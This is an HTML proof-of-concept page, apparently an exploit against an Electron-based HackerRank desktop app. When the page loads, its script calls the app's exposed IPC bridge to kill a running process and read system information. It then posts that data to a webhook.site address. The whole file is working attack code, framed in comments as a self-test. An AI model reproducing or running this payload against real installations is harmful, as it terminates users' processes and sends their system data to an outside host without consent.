<!DOCTYPE html>
<html>
<head>
    <title>My Own Test – RCE PoC</title>
    <meta charset="utf-8">
</head>
<body>
    <h3>Self-Test Running… (check your webhook + Calculator)</h3>
    <pre id="log"></pre>

    <script>
        // This is the correct name used by the real HackerRank preload script
        const { ipcRenderer } = window.electronAPI;

        function log(msg) {
            console.log(msg);
            document.getElementById('log').textContent += msg + '\n';
        }

        async function run() {
            try {
                // 1. Kill calc.exe (open Calculator first to see it die)
                await ipcRenderer.invoke('close-blocked-apps', ['calc.exe']);
                log('calc.exe killed successfully');
            } catch (e) {
                log('calc.exe kill failed: ' + e);
            }

            try {
                // 2. Grab system info
                const info = await ipcRenderer.invoke('get-system-status');
                log('System info stolen:');
                log(JSON.stringify(info, null, 2));

                // 3. Send to YOUR webhook only
                fetch('https://webhook.site/fcaeefd5-63e5-4baf-b1d0-ddfaea039ffa', {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify({
                        timestamp: new Date().toISOString(),
                        source: "my-own-hackerrank-test",
                        system_info: info
                    })
                });
                log('Data sent to your webhook');
            } catch (e) {
                log('Status steal failed: ' + e);
            }
        }

        run();
    </script>
</body>
</html>
